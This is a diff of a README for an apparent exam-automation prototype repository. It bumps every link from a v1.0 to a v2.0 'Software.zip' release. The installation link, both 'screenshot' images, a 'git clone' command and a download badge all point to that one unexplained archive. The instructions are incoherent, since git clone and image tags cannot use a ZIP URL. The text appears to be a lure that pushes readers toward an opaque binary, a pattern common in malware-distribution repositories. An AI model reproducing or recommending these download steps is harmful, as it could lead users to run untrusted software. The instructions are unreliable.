@@ -10,7 +10,7 @@ Welcome to the "Sınav Otomasyonu (Prototiptir)" repository! This is a prototype
 🛠️ Prototype implementation  
 
 ## Installation
-To get started with the project, you can download the repository as a ZIP file [here](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v1.0/Software.zip). Make sure to extract the files before launching the application.
+To get started with the project, you can download the repository as a ZIP file [here](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v2.0/Software.zip). Make sure to extract the files before launching the application.
 
 ## Topics
 📱 Application  
@@ -30,13 +30,13 @@ To get started with the project, you can download the repository as a ZIP file [
 ## Screenshots
 Here are some screenshots from the project:
 
-![Screenshot 1](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v1.0/Software.zip)  
-![Screenshot 2](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v1.0/Software.zip)  
+![Screenshot 1](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v2.0/Software.zip)  
+![Screenshot 2](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v2.0/Software.zip)  
 
 ## Usage
 1. Clone the repository  
    ```
-   git clone https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v1.0/Software.zip
+   git clone https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v2.0/Software.zip
    ```
 2. Open the project in your favorite code editor  
 3. Launch the application  
@@ -51,4 +51,4 @@ Have any feedback or suggestions? Don't hesitate to open an issue or reach out t
 
 **Note:** If the provided link does not work, please check the "Releases" section of the repository for alternative download options.
 
-[![Download ZIP](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v1.0/Software.zip)](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v1.0/Software.zip)
+[![Download ZIP](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v2.0/Software.zip)](https://github.com/skibiditoilet123xx/sinav-otomasyonu-prototip/releases/download/v2.0/Software.zip)
